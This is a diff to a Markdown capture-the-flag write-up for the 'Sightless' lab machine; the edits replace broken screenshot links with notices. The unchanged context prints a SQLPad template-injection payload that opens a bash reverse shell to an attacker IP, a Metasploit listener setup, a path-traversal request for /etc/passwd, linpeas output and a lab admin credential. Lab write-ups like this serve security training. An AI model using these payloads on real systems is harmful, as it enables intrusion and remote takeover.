@@ -30,12 +30,20 @@ Nmap done: 1 IP address (1 host up) scanned in 74.04 seconds
 
 ---
 ### Web
-![image](https://github.com/user-attachments/assets/bf0df882-9538-49d6-8c00-60ff5b63fbec)\
-![image](https://github.com/user-attachments/assets/f24bda8d-6895-4719-8c66-6b0055f0e8d2)
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/bf0df882-9538-49d6-8c00-60ff5b63fbec) returned 404 during the image audit (2026-10-08).
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/f24bda8d-6895-4719-8c66-6b0055f0e8d2) returned 404 during the image audit (2026-10-08).
+
+
 > I can not connect to SQLPad but I can to Froxlor
 >> There is a url redirect to subdomain sqlpad.slightless.htb however that we can look into later
 
-![image](https://github.com/user-attachments/assets/2d5b6713-363b-4bbd-9d7b-b0e8776d1a50)
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/2d5b6713-363b-4bbd-9d7b-b0e8776d1a50) returned 404 during the image audit (2026-10-08).
+
 
 ---
 ### Exploit: SQLPAD
@@ -71,9 +79,16 @@ Status: Downloaded newer image for sqlpad/sqlpad:latest
 b3cb8f399c68716e827f7a2cb1af0a7338b216aef2caee0abcc9dce0f54b0ad9
 ```
 Afterwards, navigate to https://localhost:3000 where the container is being hosted.\
-![image](https://github.com/user-attachments/assets/04625ac5-7be9-467b-9d3d-c5968702651f)\
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/04625ac5-7be9-467b-9d3d-c5968702651f) returned 404 during the image audit (2026-10-08).
+
+
 Then enter the information:\
-![image](https://github.com/user-attachments/assets/2994d1ba-1139-468b-8996-ba39cf86ca09)
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/2994d1ba-1139-468b-8996-ba39cf86ca09) returned 404 during the image audit (2026-10-08).
+
 
 We then want to click on Connection -> Add connection\
 Choose MySQL as driver\
@@ -127,7 +142,6 @@ Exploit target:
    0   Wildcard Target
 
 
-
 View the full module info with the info, or info -d command.
 
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.10
@@ -135,7 +149,10 @@ lhost => 10.10.14.10
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 1337
 lport => 1337
 ```
-![image](https://github.com/user-attachments/assets/3e86739f-3fa4-4171-860d-44e03f073c56)
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/3e86739f-3fa4-4171-860d-44e03f073c56) returned 404 during the image audit (2026-10-08).
+
 
 Now...how do I mimic the *docker exec...* stuff?\
 Direct file access in url?\
@@ -156,7 +173,10 @@ Exploit sent, but server responded with status code: 400. Check your listener.
 ```Bash
 {{ process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.46/1337 0>&1"') }}
 ```
-![image](https://github.com/user-attachments/assets/180e1d05-bf31-438e-887e-ae63eedf76d0)
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/180e1d05-bf31-438e-887e-ae63eedf76d0) returned 404 during the image audit (2026-10-08).
+
 
 ---
 ### POST-EXPLOIT A 
@@ -305,7 +325,6 @@ permission denied while trying to connect to the Docker daemon socket at unix://
 Running the Linpeas:
 ```Bash
 michael@sightless:~$ ./linpeas.sh 
-
 
 
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
@@ -526,7 +545,6 @@ Learn and practice cloud hacking techniques in training.hacktricks.wiki
 ═╣ Azure APP? ........................... No
 ═╣ Aliyun ECS? .......................... No
 ═╣ Tencent CVM? ......................... No
-
 
 
                 ╔════════════════════════════════════════════════╗
@@ -878,7 +896,6 @@ Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <p
 Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)
 
 
-
                               ╔═════════════════════╗
 ══════════════════════════════╣ Network Information ╠══════════════════════════════
                               ╚═════════════════════╝
@@ -950,7 +967,6 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 
 ╔══════════╣ Can I sniff with tcpdump?
 No
-
 
 
                                ╔═══════════════════╗
@@ -1056,7 +1072,6 @@ michael          pts/0    10.10.14.46      Fri Jan 10 21:16:00 +0000 2025
 ╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
-
 
 
                              ╔══════════════════════╗
@@ -1433,8 +1448,6 @@ drwxr-xr-x 2 root root 4096 Aug  9 11:17 /etc/apt/keyrings
 drwxr-xr-x 2 root root 4096 Sep  3 08:19 /usr/share/keyrings
 
 
-
-
 ╔══════════╣ Analyzing FastCGI Files (limit 70)
 -rw-r--r-- 1 root root 1055 May 30  2023 /etc/nginx/fastcgi_params
 
@@ -1454,20 +1467,13 @@ local_enable
 anon_root=/var/ftp/
 
 
-
 -rw-r--r-- 1 root root 69 May  1  2024 /etc/php/8.1/mods-available/ftp.ini
 -rw-r--r-- 1 root root 69 Jun 14  2024 /usr/share/php8.1-common/common/ftp.ini
-
-
-
-
 
 
 ╔══════════╣ Analyzing DNS Files (limit 70)
 -rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind
 -rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind
-
-
 
 
 ╔══════════╣ Analyzing Interesting logs Files (limit 70)
@@ -1480,36 +1486,11 @@ anon_root=/var/ftp/
 -rw-r--r-- 1 michael michael 3771 Jan  6  2022 /home/michael/.bashrc
 
 
-
-
-
 -rw-r--r-- 1 root root 807 Jan  6  2022 /etc/skel/.profile
 -rw-r--r-- 1 michael michael 807 Jan  6  2022 /home/michael/.profile
 
 
-
-
 ╔══════════╣ Analyzing Windows Files (limit 70)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 lrwxrwxrwx 1 root root 20 May 15  2024 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
@@ -1517,37 +1498,8 @@ lrwxrwxrwx 1 root root 24 May 15  2024 /etc/mysql/my.cnf -> /etc/alternatives/my
 -rw-r--r-- 1 root root 81 Aug  9 10:32 /var/lib/dpkg/alternatives/my.cnf
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ╔══════════╣ Analyzing FreeIPA Files (limit 70)
 drwxr-xr-x 2 root root 4096 Sep  3 08:21 /usr/src/linux-headers-5.15.0-119/drivers/net/ipa
-
-
 
 
 ╔══════════╣ Searching mysql credentials and exec
@@ -1678,7 +1630,6 @@ tmux 3.2a
 
 
 /tmp/tmux-1000
-
 
 
                       ╔════════════════════════════════════╗
@@ -1838,7 +1789,6 @@ drwxr-xr-x 114 root root 4096 Sep  3 08:19 ..
 /tmp/test.php
 /tmp/test
 /tmp/chisel
-
 
 
                             ╔═════════════════════════╗
@@ -2067,7 +2017,6 @@ drwxr-xr-x 4 www-data www-data 4.0K Aug  2 10:01 .
 10.10.16.6 - - [09/Jan/2025:03:06:52 +0000] "GET /download?filename=../../../../etc/passwd HTTP/1.1" 200 722 "-" "curl/8.11.0"
 
 
-
                                 ╔════════════════╗
 ════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                 ╚════════════════╝
@@ -2194,9 +2143,13 @@ michael@sightless:~$
 └──╼ [★]$ cat /etc/hosts | grep admin
 127.0.0.1 admin.sightless.htb
 ```
-![image](https://github.com/user-attachments/assets/21f2f399-ab0f-45d3-a039-13d67f5e3c2d)
 
-![image](https://github.com/user-attachments/assets/abbe5036-661d-40fa-8af9-c85358544cda)
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/21f2f399-ab0f-45d3-a039-13d67f5e3c2d) returned 404 during the image audit (2026-10-08).
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/abbe5036-661d-40fa-8af9-c85358544cda) returned 404 during the image audit (2026-10-08).
+
 
 > **I couldn't get it to work, but you are supposed to see in the network tab once you ge the right port the raw credentials**
 
@@ -2204,10 +2157,16 @@ These are *admin:ForlorfroxAdmin*
 
 ---
 ### POST EXPLOIT B
-![image](https://github.com/user-attachments/assets/147477a5-5751-4d78-a7a5-178db72aed55)
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/147477a5-5751-4d78-a7a5-178db72aed55) returned 404 during the image audit (2026-10-08).
+
 
 Ensure the PHP-FPM is enable:\
-![image](https://github.com/user-attachments/assets/806848dd-9ebd-4f60-ac45-837d527800a2)
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/806848dd-9ebd-4f60-ac45-837d527800a2) returned 404 during the image audit (2026-10-08).
+
 
 Now we can see that it goes into the /tmp dir
 
@@ -2237,6 +2196,5 @@ admin@localhost's password:
 michael@sightless.htb's password: 
 scp: remote open "/tmp/id_rsa": Permission denied
 ```
-
 
 
